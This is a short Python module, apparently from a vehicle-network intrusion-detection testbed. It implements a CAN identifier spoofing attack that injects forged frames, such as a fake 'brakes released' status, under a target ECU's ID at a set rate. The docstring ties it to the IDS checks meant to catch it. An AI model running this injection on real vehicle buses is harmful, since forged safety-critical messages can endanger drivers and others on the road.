"""
Identifier spoofing attack: an attacker impersonates a legitimate ECU by
injecting extra frames on that ECU''s arbitration ID with attacker-chosen
payload (e.g. forging a "brakes released" status). On a broadcast bus there
is no source field to fake, so the tell is either an elevated message rate
for that ID or timing that no longer matches the legitimate ECU''s period -
both of which the IDS module checks for.
"""

from __future__ import annotations

import time

import can


def run_spoofing_attack(
    bus: can.Bus,
    target_id: int,
    duration_s: float,
    rate_hz: float,
    spoofed_payload: bytes,
) -> int:
    """Inject `spoofed_payload` under `target_id` at `rate_hz` for `duration_s`."""
    interval = 1.0 / rate_hz if rate_hz > 0 else 0.0
    end_time = time.monotonic() + duration_s
    sent = 0
    data = spoofed_payload[:8].ljust(8, b"\x00")
    while time.monotonic() < end_time:
        msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
        try:
            bus.send(msg)
            sent += 1
        except can.CanError:
            pass
        if interval > 0:
            time.sleep(interval)
    return sent